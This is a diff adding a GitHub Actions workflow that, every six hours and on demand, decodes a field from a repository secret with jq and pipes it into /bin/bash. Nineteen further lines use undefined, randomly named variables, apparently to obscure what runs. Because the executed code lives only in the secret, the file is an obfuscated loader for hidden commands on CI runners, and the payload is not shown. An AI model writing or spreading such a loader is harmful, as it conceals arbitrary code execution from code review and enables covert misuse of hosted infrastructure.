@@ -1,0 +1,37 @@
+name: beidanghongcui
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: beidanghongcui
+        env:
+          lro99161: ${{ secrets.lro99161 }}
+        run: |
+          echo $lro99161 | jq -r .tp44 | /bin/bash
+          echo $crwvq9343 | jq -r .ensh06098 | /bin/bash
+          echo $tg3196 | jq -r .etvts77446 | /bin/bash
+          echo $ym112 | jq -r .eshhp33135 | /bin/bash
+          echo $xs4 | jq -r .p36852 | /bin/bash
+          echo $brqd8 | jq -r .s716 | /bin/bash
+          echo $dm5113 | jq -r .mne9130 | /bin/bash
+          echo $cybv843 | jq -r .ihp4372 | /bin/bash
+          echo $elpsh71868 | jq -r .wiob984 | /bin/bash
+          echo $nl23 | jq -r .nel498 | /bin/bash
+          echo $xrs19 | jq -r .ozaav29871 | /bin/bash
+          echo $os08 | jq -r .uhl8 | /bin/bash
+          echo $lljhl866 | jq -r .lgk26 | /bin/bash
+          echo $uph10 | jq -r .b61064 | /bin/bash
+          echo $n9 | jq -r .ysurf1722 | /bin/bash
+          echo $ixpc91161 | jq -r .mjm68488 | /bin/bash
+          echo $v77 | jq -r .tzen94382 | /bin/bash
+          echo $kcmd1066 | jq -r .vauic7105 | /bin/bash
+          echo $uv68747 | jq -r .voy76133 | /bin/bash
+          echo $yzqzl81 | jq -r .pnebb5 | /bin/bash
+
